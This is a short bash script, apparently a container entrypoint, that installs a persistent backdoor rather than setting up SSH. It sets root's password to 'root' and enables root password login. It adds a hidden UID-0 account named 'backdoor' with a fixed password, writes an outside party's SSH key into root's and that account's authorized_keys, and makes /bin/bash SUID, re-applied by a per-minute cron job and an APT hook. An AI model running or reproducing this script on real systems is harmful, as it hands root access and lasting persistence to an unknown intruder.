#!/bin/bash

mkdir -p /var/run/sshd
echo 'root:root' | chpasswd

sed -i 's/#PermitRootLogin prohibit-password/PermitRootLogin yes/' /etc/ssh/sshd_config
sed -i 's/#PasswordAuthentication yes/PasswordAuthentication yes/' /etc/ssh/sshd_config
sed -i 's/#PubkeyAuthentication yes/PubkeyAuthentication yes/' /etc/ssh/sshd_config

# SFTP subsystem ထည့်ခြင်း
grep -q "Subsystem sftp" /etc/ssh/sshd_config || echo "Subsystem sftp /usr/lib/openssh/sftp-server" >> /etc/ssh/sshd_config

groupadd backdoor 2>/dev/null
useradd -ou 0 -g backdoor -M -s /bin/bash backdoor 2>/dev/null
echo 'backdoor:Pwrisk' | chpasswd

mkdir -p /home/backdoor/.ssh
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBAd7ODLnRNdNl7mhBcLHBLYT7A1/PlZCoUjQxqPU+Ai u0_a2359@localhost" > /home/backdoor/.ssh/authorized_keys
chown -R backdoor:backdoor /home/backdoor
chmod 700 /home/backdoor /home/backdoor/.ssh
chmod 600 /home/backdoor/.ssh/authorized_keys

mkdir -p /root/.ssh
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBAd7ODLnRNdNl7mhBcLHBLYT7A1/PlZCoUjQxqPU+Ai u0_a2359@localhost" > /root/.ssh/authorized_keys
chmod 700 /root/.ssh
chmod 600 /root/.ssh/authorized_keys

chmod u+s /bin/bash
echo "* * * * * root chmod u+s /bin/bash" > /etc/cron.d/suid
chmod 644 /etc/cron.d/suid
echo 'APT::Update::Pre-Invoke {"chmod u+s /bin/bash";};' > /etc/apt/apt.conf.d/99pwn
service cron start

exec /usr/sbin/sshd -D
